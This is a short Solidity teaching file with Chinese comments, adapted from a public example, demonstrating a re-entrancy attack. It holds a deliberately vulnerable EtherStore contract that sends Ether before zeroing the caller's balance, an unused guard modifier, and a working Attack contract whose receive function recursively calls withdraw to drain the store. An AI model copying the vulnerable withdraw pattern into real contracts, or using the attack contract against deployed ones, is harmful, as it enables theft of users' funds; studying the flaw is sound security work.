// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

// https://solidity-by-example.org/hacks/re-entrancy/
// 演示对合约的重入攻击

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

// 一个可以存取Eth的合约
contract EtherStore {
    // 记录所有在该合约有存储Eth的地址信息和数量
    mapping(address => uint) public accounts;

    // 接收发到该合约的Eth
    function deposit() public payable {
        accounts[msg.sender] += msg.value;
    }

    // 取款
    function withdraw() public {
        uint balance = accounts[msg.sender];
        require(balance > 0, "withdraw amount is more than balance");

        (bool success, ) = msg.sender.call{value: balance}("");

        require(success, "Withdraw Ether failed");

        accounts[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // 接收到Ether时，再去withdraw，递归调用
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
        console.log(address(this).balance);
    }

    function deposit() external payable {}

    function attack() external payable {
        // 先给目标合约存储Ether
        etherStore.deposit{value: 1 ether}();
        // 提取Ether
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
